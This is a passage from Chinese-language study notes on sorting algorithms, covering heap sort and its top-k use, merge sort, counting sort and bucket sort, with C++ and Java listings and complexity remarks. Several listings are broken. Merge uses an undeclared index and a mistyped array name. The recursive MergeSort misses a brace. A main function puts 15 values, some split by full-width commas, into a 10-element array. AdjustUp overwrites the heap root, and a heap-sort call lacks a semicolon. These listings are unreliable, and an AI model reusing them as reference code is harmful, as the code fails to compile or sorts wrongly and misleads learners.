class="number">1</span>;      <span class="comment">// R[son]定义为R[dad]的左孩子</span></span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="comment">// 如果孩子结点的索引未超出范围，继续向下调整，循环继续</span></span><br><span class="line">    <span class="keyword">while</span> (son &lt;= end)&#123;</span><br><span class="line">        <span class="comment">// 比较两个孩子的关键字，选择最大的</span></span><br><span class="line">        <span class="keyword">if</span>(son+<span class="number">1</span>&lt;end &amp;&amp; R[son].key&lt;R[son+<span class="number">1</span>].key)</span><br><span class="line">            son++;</span><br><span class="line">        <span class="comment">// 若根结点的关键字大于孩子结点，表示调整完成，直接跳出函数</span></span><br><span class="line">        <span class="keyword">if</span>(R[dad].key &gt; R[son].key) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 若根结点的关键字小于孩子结点</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tmp = R[dad];</span><br><span class="line">            R[dad] = R[son];     <span class="comment">// 孩子结点和根结点互换</span></span><br><span class="line">            R[son] = tmp;</span><br><span class="line">            dad = son;           <span class="comment">// 孩子结点作为下一循环的根结点，继续向下调整</span></span><br><span class="line">            son = <span class="number">2</span>*dad+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(RecType R[], <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">    RecType tmp;</span><br><span class="line">    <span class="comment">// 大根堆的初始化：分支结点一共有n/2个，所以调用sift算法n/2次，从下往上（n/2-1到0）将所有以分支节点作为根的子树调整为大根堆</span></span><br><span class="line">    <span class="keyword">for</span>(i=n/<span class="number">2</span><span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line"><span class="built_in">AdjustDown</span>(R, i, n<span class="number">-1</span>);    <span class="comment">// 以i作为根结点，向下调整为大根堆</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将根结点（最大元素）与最右边叶子结点互换，然后不考虑换下的最大元素，继续调整堆为大根堆，循环n-1次</span></span><br><span class="line">    <span class="keyword">for</span>(i=n<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--)&#123;</span><br><span class="line">        tmp = R[<span class="number">0</span>];      <span class="comment">// 取出根结点R[0]（目前的最大元素），与叶子结点R[i]互换</span></span><br><span class="line">        R[<span class="number">0</span>] = R[i];</span><br><span class="line">        R[i] = tmp;</span><br><span class="line">        <span class="built_in">AdjustDown</span>(R, <span class="number">0</span>, i<span class="number">-1</span>)  <span class="comment">// 根结点被交换，需要调整新堆为大根堆，且不考虑结点R[i]，R[i]已经有序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大根堆的初始化如下图，对应上述代码中的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=n/<span class="number">2</span><span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line"><span class="built_in">AdjustDown</span>(R, i, n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719153149904.png" alt="image-20220719153149904"></p><ul><li><p><strong>复杂度</strong></p><p>大根堆的调整中，即调用sift函数，<strong>向下调整的时间</strong>与树高有关，为O(h)，<strong>即</strong> $O(log_2n)$。建堆过程中每次向下调整时，大部分结点的高度都较小。因此，可以证明在元素个数为n的序列上**建堆的时间复杂度为 O(n)**，这说明可以在线性时间内，将一个无序数组建成一个大顶堆。</p><p>在最好、最坏和平均情况下，堆排序的时间复杂度为$O(nlog_2n)$；空间复杂度为$O(1)$。</p></li><li><p><strong>稳定性</strong>：不稳定。</p></li><li><p>上述代码中的 <strong>AdjustDown函数</strong> 是<u>向下调整大根堆，适用于根结点被交换（删除），使堆的性质被破环的情况</u>。比如删除堆顶元素后，应该使用最后一个元素替换堆顶，然后比较堆顶和其左右孩子，交换，然后继续向下调整；而如果是作为叶子结点向堆中插入元素，那么就需要<u>向上调整堆，代码如下</u>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AdjustUp</span><span class="params">(RecType R[], <span class="type">int</span> k)</span></span>&#123;   <span class="comment">// n为所插入的结点索引，也为新堆的结点个数，结点索引从0开始编号</span></span><br><span class="line">    R[<span class="number">0</span>] = R[k];        <span class="comment">// 将R[k]暂存到根结点R[0]</span></span><br><span class="line">    <span class="type">int</span> i = (k<span class="number">-1</span>)/<span class="number">2</span>;    <span class="comment">// i始终指向k的父节点</span></span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span> &amp;&amp; R[i].key&lt;R[<span class="number">0</span>].key)&#123;</span><br><span class="line">        <span class="built_in">swap</span>(R[k], R[i]);    <span class="comment">// 父节点下调</span></span><br><span class="line">        k = i;          <span class="comment">// 更新父节点为k，继续向上比较</span></span><br><span class="line">        i = (k<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    R[k] = R[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="堆排序的应用"><a href="#堆排序的应用" class="headerlink" title="堆排序的应用"></a>堆排序的应用</h4><blockquote><p>&#x3D;&#x3D;最小的k个数&#x3D;&#x3D;</p><p>输入n个整数，输出其中最小的k个。例如输入1, 2, 3, 4, 5, 6, 7和8这8个数字，则最小的4个数字为1, 2, 3和4。(2012. 网易)</p></blockquote><p>在讲快排的时候，已经提出了利用快排的一次划分来解此题，时间复杂度为O(n)。但此种方法也有其限制，首先我们需要一次性读入所有数据，其次，需要修改输入的数组。</p><p>其实此题也可以利用堆排序来解决，此种方法<strong>特别适合于处理海量数据</strong>。</p><p>首先我们读入k个数创建一个大小为 k 的大根堆，然后我们依次读入剩余数据，如果当前数据比大根堆的堆顶小，则用这个数替换当前堆顶，并调整堆使其保持大根堆的性质；如果当前数据比堆顶大，那么这个数不可能是最小的k个整数之一，故可以抛弃此数。**此种方法总的时间复杂度是O(nlogk)**。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[n];<span class="comment">// 数组a中存储输入的n个数</span></span><br><span class="line"><span class="type">int</span> R[k+<span class="number">1</span>];<span class="comment">//从a中依次读入k个数a[0]到a[k-1]，第一个数存在R[0]中，依此类推</span></span><br><span class="line"><span class="comment">// 初始化R为大根堆</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=k/<span class="number">2</span><span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line"><span class="built_in">AdjustDown</span>(R, i, k<span class="number">-1</span>);    <span class="comment">// 以i作为根结点，向下调整为大根堆</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=k; i&lt;=n<span class="number">-1</span>; i++) &#123;   <span class="comment">// 依次读入剩余数据</span></span><br><span class="line"><span class="keyword">if</span>(a[i]&gt; R[<span class="number">0</span>]) <span class="keyword">continue</span>;  <span class="comment">// 大于堆顶，跳过</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">R[<span class="number">0</span>]=a[i];   <span class="comment">// 替换堆顶</span></span><br><span class="line"><span class="built_in">AdjustDown</span>(R, <span class="number">0</span>, k<span class="number">-1</span>);   <span class="comment">// 调整大根堆</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当需要求最大的k个数时，只需将大根堆改为小根堆即可，原理相同。</p><h3 id="5-4-归并排序"><a href="#5-4-归并排序" class="headerlink" title="5.4 归并排序"></a>5.4 归并排序</h3><p>“归并”的含义是将两个或两个以上的有序表组合成一个新的有序表。</p><h4 id="二路归并排序"><a href="#二路归并排序" class="headerlink" title="二路归并排序"></a>二路归并排序</h4><p>参考：<a href="https://www.bilibili.com/video/BV1Ur4y1w7tv?p=17">https://www.bilibili.com/video/BV1Ur4y1w7tv?p=17</a></p><p>假定待排序表含有n个元素，首先可以视为n个有序的子表，每个子表长度为1，然后<strong>两两归并</strong>，得到$\lceil n&#x2F;2 \rceil$个长度为2或1的有序表；再两两归并，如此重复，直到合并成一个长度为n的有序表为止，这种排序方法称为二路归并排序。如图15-4所示为二路归并排序的例子。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220719164616656.png" alt="image-20220719164616656"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/mergeSort.gif" alt="动图演示"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将有序的R[left…mid]和R[mid +1 …right]归并到辅助数组rf[left…right]</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(ElemType R[], ElemType *rf, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j, k;</span><br><span class="line">    <span class="keyword">for</span>(i=left, j=mid+<span class="number">1</span>, k=i; i&lt;=mid &amp;&amp; j &lt;=right; ++k)&#123;  <span class="comment">// i在前一段有序表扫描，j在另一段有序表扫描</span></span><br><span class="line">        <span class="comment">// 依次比较，将更小的数存入rf，存入后指针索引后移</span></span><br><span class="line">        <span class="keyword">if</span>(R[j] &lt; R[i]) rf[k] = r[j++];</span><br><span class="line">        <span class="keyword">else</span> rf[k] = r[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 有一个有序表的指针索引到达末尾，将另一有序表的剩余元素全部存入rf即可</span></span><br><span class="line">    <span class="comment">// 两个while只会有一个执行</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid)  rf[k++] = r[i++];</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= right)  rf[k++] = r[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 递归写法（分治法） */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(ElemType R[], ElemType *rf, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(left&lt;right)&#123;</span><br><span class="line">        <span class="type">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort</span>(R, rf, left, mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(R, rf, mid+<span class="number">1</span>, right);</span><br><span class="line">        <span class="built_in">Merge</span>(R, rf, left, mid, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 非递归写法 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(ElemType R[], ElemType *rf, <span class="type">int</span> n)</span></span>&#123;   <span class="comment">// n为待排序表R的长度</span></span><br><span class="line">    <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">    ElemType *q = R;</span><br><span class="line">    ElemType *tmp;</span><br><span class="line">    <span class="keyword">while</span>(len &lt; n) &#123;    <span class="comment">// 所归并的序列长度</span></span><br><span class="line">        <span class="type">int</span> s = len;</span><br><span class="line">        len = <span class="number">2</span> * s ;   <span class="comment">// 更新len为原来的2倍，因为是两两合并</span></span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i+len &lt; n)&#123;  <span class="comment">// 要合并的两个序列末尾索引不超过n-1</span></span><br><span class="line">            <span class="built_in">Merge</span>(q, rf,  i, i+s<span class="number">-1</span>, i+len<span class="number">-1</span> ); <span class="comment">//对等长的两个子表合并</span></span><br><span class="line">            i = i+len;  <span class="comment">// 定位i到下一组要合并的序列</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i+s &lt; n)&#123;    <span class="comment">//最后一组不等长的两个子表合并</span></span><br><span class="line">            <span class="built_in">Merge</span>(q, rf,  i, i+s<span class="number">-1</span>, n<span class="number">-1</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 一轮归并结束，R所有元素转移到rf，所以要交换q,rf，以保证下一趟归并时，仍从q归并到rf</span></span><br><span class="line">        tmp = q; </span><br><span class="line">        q = rf;</span><br><span class="line">        rf = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">2</span>，<span class="number">3</span>,<span class="number">4</span>，<span class="number">5</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">36</span>,<span class="number">38</span>,<span class="number">44</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span class="number">50</span>&#125;;</span><br><span class="line">    <span class="type">int</span> b[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">MergeSort</span>(a, b, <span class="number">15</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>复杂度</strong>：</p><p>最坏情况下，合并两个大小为n的已排序数组所需要的比较次数为2n-1，所以每一趟归并的时间复杂度为$O(n)$，共需进行$\lceil log_2n \rceil$趟归并，所以算法的<strong>时间复杂度</strong>为$\lceil nlog_2n \rceil$。</p><p>Merge()操作中，由于辅助空间刚好要占用n个单元，但每一趟归并后这些空间就被释放了，所以归并排序的<strong>空间复杂度</strong>为$O(n)$。</p></li><li><p><strong>稳定性</strong>：由于Merge()操作不会改变相同元素的相对次序，所以二路归并排序算法是一个<strong>稳定</strong>的排序方法。</p></li><li><p><strong>原地归并排序</strong></p></li></ul><h4 id="多路归并排序"><a href="#多路归并排序" class="headerlink" title="多路归并排序"></a>多路归并排序</h4><p><strong>外部排序</strong>指的是大文件的排序，即待排序的记录存储在外部存储器上，待排序的文件无法一次装入内存，需要在内存和外部存储器之间进行多次数据交换，以达到排序整个文件的目的。</p><p><u>外部排序最常用的算法是<strong>多路归并排序</strong></u>，即将原文件分解成多个能够一次性装入内存的部分， 分别把每一部分调入内存完成排序。 然后，对已经排序的子文件进行归并排序。</p><p>从二路到多路（k路），增大k可以减少外存信息读写时间，但k个归并段中选取最小的记录需要比较k-1次，为了降低选出每个记录需要的比较次数k，引出了“败者树”的概念。</p><p><strong>败者树</strong> 是对树形选择排序的一种变形，可以视为一棵完全二叉树。每个叶结点存放各归并段在归并过程中当前参加比较的记录，内部结点用来记忆左右子树中的“失败者”，而让胜者往上继续进行比较，一直到根结点。如果比较两个数，大的为失败者、小的为胜利者，则根结点指向的数为最小数。</p><h3 id="5-5-计数排序"><a href="#5-5-计数排序" class="headerlink" title="5.5 计数排序"></a>5.5 计数排序</h3><p>计数排序统计小于等于该元素值的元素的个数i，于是该元素就放在目标数组的索引i位（i≥0）。</p><ul><li>计数排序基于一个假设，待排序数列的<strong>所有数均为整数</strong>，且出现在（0，k）的区间之内。</li><li>如果 k（待排数组的最大值） 过大则会引起较大的空间复杂度，<strong>不适合数范围大的情况</strong>，一般是用来排序 0 到 100 之间的数字的最好的算法（比如考试分数排名），但是它不适合按字母顺序排序人名。</li><li>计数排序不是比较排序，排序的速度快于任何比较排序算法。</li><li>计数排序是<strong>稳定</strong>的排序算法。</li></ul><p><strong>算法思想</strong>：</p><ol><li>找出待排序的数组中最大元素；</li><li>统计数组中每个值为 i 的元素出现的次数，存入数组 C 的第 i 项；</li><li>向填充目标数组：将每个元素 i 填充进新数组，填充次数为 C[i] ；</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/0m4YX595Fonjcg9PmOPc6g3VnEFMSU9hQNqdTja9dCGls0V9Ve7JolUmUxbVtHlrybsmNC84jWHHibL9kLicw8BQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&retryload=1" alt="图片"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; vecRaw, vector&lt;<span class="type">int</span>&gt;&amp; vecObj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 若待排序容器为空</span></span><br><span class="line"><span class="keyword">if</span> (vecRaw.<span class="built_in">size</span>() == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 使用 vecRaw 的最大值 + 1 作为计数容器 countVec 的大小</span></span><br><span class="line">    <span class="comment">// max_element用于查询容器中最大值第一次出现的位置</span></span><br><span class="line"><span class="type">int</span> vecCountLength = (*<span class="built_in">max_element</span>(<span class="built_in">begin</span>(vecRaw), <span class="built_in">end</span>(vecRaw))) + <span class="number">1</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">vecCount</span><span class="params">(vecCountLength, <span class="number">0</span>)</span></span>;  <span class="comment">// 用于记录所有元素的出现次数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 统计每个键值出现的次数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vecRaw.<span class="built_in">size</span>(); i++)</span><br><span class="line">vecCount[vecRaw[i]]++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后面的键值出现的位置为前面所有键值出现的次数之和</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; vecCountLength; i++)</span><br><span class="line">vecCount[i] += vecCount[i<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将键值放到目标位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = vecRaw.<span class="built_in">size</span>(); i &gt; <span class="number">0</span>; i--)<span class="comment">// 此处逆序是为了保持相同键值的稳定性</span></span><br><span class="line">vecObj[--vecCount[vecRaw[i<span class="number">-1</span>]]] = vecRaw[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vecRaw = &#123; <span class="number">0</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">vecObj</span><span class="params">(vecRaw.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CountSort</span>(vecRaw, vecObj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vecObj.<span class="built_in">size</span>(); ++i)</span><br><span class="line">cout &lt;&lt; vecObj[i] &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>稳定性</strong>：稳定。</li><li><strong>缺点</strong>：空间浪费。其需要长度为最大值的计数空间，但是其间的很多数值可能并未出现。</li><li><strong>优化</strong>：使用长度为最大值-最小值+1的计数空间。</li></ul><h3 id="x3D-x3D-5-5-桶排序-x3D-x3D-（重要）"><a href="#x3D-x3D-5-5-桶排序-x3D-x3D-（重要）" class="headerlink" title="&#x3D;&#x3D;5.5 桶排序&#x3D;&#x3D;（重要）"></a>&#x3D;&#x3D;5.5 桶排序&#x3D;&#x3D;（重要）</h3><p>桶排序 (Bucket sort)是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。</p><p>参考：<a href="https://www.bilibili.com/video/BV1Ur4y1w7tv">https://www.bilibili.com/video/BV1Ur4y1w7tv</a></p><p><strong>工作原理</strong>：</p><p>假设输入数据<strong>服从均匀分布</strong>，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）。</p><ol><li>设置一个定量的数组当作空桶子。</li><li>寻访序列，并且把项目一个一个放到对应的桶子去（比如一位数放到一个桶、两位数放到一个桶、三位数放到一个桶）。</li><li>对每个不是空的桶子进行排序（递归或者使用其他排序算法）。</li><li>从不是空的桶子里把项目再放回原来的序列中，合并。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/0m4YX595Fonjcg9PmOPc6g3VnEFMSU9hjl4T0fCvUq2zCdEcGqyH1ic9bDXVStxQXWcypoAs5VQ499ABm6dicYbA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BucketSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">InsertSort</span> <span class="variable">insertSort</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InsertSort</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line">        <span class="keyword">return</span> bucketSort(arr, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] bucketSort(<span class="type">int</span>[] arr, <span class="type">int</span> bucketSize) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">minValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &lt; minValue) &#123;</span><br><span class="line">                minValue = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; maxValue) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">bucketCount</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor((maxValue - minValue) / bucketSize) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[][] buckets = <span class="keyword">new</span> <span class="title class_">int</span>[bucketCount][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用映射函数将数据分配到各个桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor((arr[i] - minValue) / bucketSize);</span><br><span class="line">            buckets[index] = arrAppend(buckets[index], arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">arrIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] bucket : buckets) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bucket.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对每个桶进行排序，这里使用了插入排序</span></span><br><span class="line">            bucket = insertSort.sort(bucket);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> value : bucket) &#123;</span><br><span class="line">                arr[arrIndex++] = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] arrAppend(<span class="type">int</span>[] arr, <span class="type">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span 